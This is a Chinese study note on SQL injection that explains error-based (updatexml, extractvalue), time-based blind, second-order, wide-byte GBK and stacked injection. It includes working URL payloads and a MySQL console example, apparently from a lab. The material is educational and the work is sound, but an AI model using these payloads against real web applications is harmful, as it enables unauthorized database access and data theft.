#### **updatexml报错：**

```
?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1)--+
```

- MySQL的XML处理函数
- 语法：`updatexml(XML_document, XPath_string, new_value)`
- 当XPath格式错误时，MySQL会报错并**显示错误信息**

- **`concat(0x7e,database(),0x7e)`**：
  - `concat()`：字符串连接函数
  - `0x7e`：十六进制，代表波浪号 `~`
  - `database()`：MySQL函数，返回当前数据库名
  - 组合结果：`~数据库名~`
  - **关键**：故意构造一个错误的XPath格式（以`~`开头），触发报错
- **第三个参数 `1`**：要替换的新值（实际不会替换）

#### extractvalue() 报错注入：

同updatexml差不多

```
?id=1' and extractvalue(1,concat(0x7e,database(),0x7e))--+
```

##### 与 updatexml() 的对比

| 特性     | extractvalue() | updatexml() |
| :------- | :------------- | :---------- |
| 参数个数 | 2个            | 3个         |
| 功能     | 提取XML值      | 更新XML值   |
| 字符限制 | 32字符         | 32字符      |
| 使用频率 | 较高           | 较高        |
| 语法     | 更简洁         | 稍复杂      |

#### sleep函数：

时间盲注：当页面没有明显回显（无报错、无数据展示）时，通过时间延迟判断注入是否成功。

```
布尔型时间盲注：?id=1' and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+
```

- 如果页面响应延迟5秒 → 说明SQL执行成功，存在注入
- 如果页面立即响应 → 说明SQL执行失败，可能不存在注入或语法错误

#### **二次注入**

简单概括就是黑客精心构造 SQL 语句插入到数据库中，数据库报错的信息被其他类型的 SQL 语句调用的时候触发攻击行为。因为第一次黑客插入到数据库的时候并没有触发危害性，而是再其他语句调用的时候才会触发攻击行为，这个就是二次注入。

#### **宽字节注入**

是利用**字符编码转换问题**绕过程序转义机制的SQL注入技术。主要影响使用**GBK、GB2312、BIG5**等多字节字符集的应用程序。

```
正常情况：
输入：'
转义后：\'
SQL：WHERE username='\''  → 安全

宽字节漏洞：
输入：%bf'
转义后：%bf\' → 0xbf5c27
GBK解码：0xbf5c 被识别为一个宽字节字符
剩下：0x27（单引号） → 注入成功！
```

**统一字符集**：始终使用UTF-8是最好实践

SQL注入绕过技术:大小写绕过、双写绕过注入、编码绕过注入、内联注释绕过

#### \*\*堆叠注入：

MySQL 的命令行中，每一条语句以 `;` 结尾，这代表语句的结束，如果在注入过程中在 `;` 后面添加要执行的 SQL 语句的话，这种注入方式就叫做堆叠注入 (stacked injection) 。下面就是简单的示例：

```bash
mysql> select * from users where id = 1;select version();
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
+----+----------+----------+
1 row in set (0.00 sec)

+-------------------------+
| version()               |
+-------------------------+
| 5.5.44-0ubuntu0.14.04.1 |
+-------------------------+
1 row in set (0.00 sec)
```

与 union select 联合查询相比，堆叠查询更加灵活，可以执行任意的 SQL 语句。

**局限性**

1. 并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎。
2. 在 Web 中代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果只能被忽略

这个就是为什么我们尝试用 union select 联合查询的原因，使用堆叠注入前，我们还需要了解数据库的相关信息才可以，如表名、列名等

在SQL注入中，**确定查询返回的列数**是进行`UNION`注入攻击的**必要前提条件**。order by查询

- 看到 `''[输入]'''` 这种格式 → 单引号闭合
- 看到 `"[输入]"` 相关错误 → 双引号相关
- 看到括号在错误片段中 → 有括号闭合
